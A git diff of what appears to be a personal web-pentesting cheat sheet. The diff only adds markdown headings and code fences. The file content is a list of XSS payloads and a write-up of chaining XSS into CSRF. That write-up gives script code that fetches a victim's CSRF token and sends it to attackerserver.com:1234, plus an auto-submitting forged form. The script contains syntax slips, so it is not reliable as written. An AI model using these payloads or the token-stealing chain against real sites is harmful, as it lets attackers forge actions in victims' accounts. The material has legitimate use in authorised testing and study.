@@ -1,5 +1,8 @@
-Note -  url encode special charcters
 
+# Common Payloads
+
+Note -  url encode special charcters
+```
 <script>alert(1)</script>
 <script>prompt(1)</script>
 <script>confirm(1)</script>
@@ -33,17 +36,17 @@ Note -  url encode special charcters
 ";onfocus=alert(1)//123
 -;'alert(1)-';
 
-
+```
 
 *************************************************************************
 
-XSS chained for CSRF 
+# XSS chained for CSRF 
 
 The app was fetching updated CSRF token everytime through a URL, we utilised that url to fetch latest csrf token and using  XSS sent it to attacker server in query parameter of URL which is hosting CSRF poc and the poc automatically fetch token from query parameter and executed poc successfully.
 
 note - convert space and special characters into url encoding
      - edit host file of server to attackerserver.com and start http server on port 1234
-
+```
 <script>
 fetch('https://vulnerable.com/somepage.do?Token)
     .then(response -> response.text())
@@ -54,9 +57,9 @@ function getcsrf(data){
     window.location.replace('http://attackerserver.com:1234/csrfpoc.html?token=$(token)')
 }
 </script>
-
-and CSRF POC
-
+```
+CSRF POC
+```
 <html>
 <body>
 <form>
@@ -77,3 +80,4 @@ document.forms[0].submit();
 </script>
 
 </html>
+```
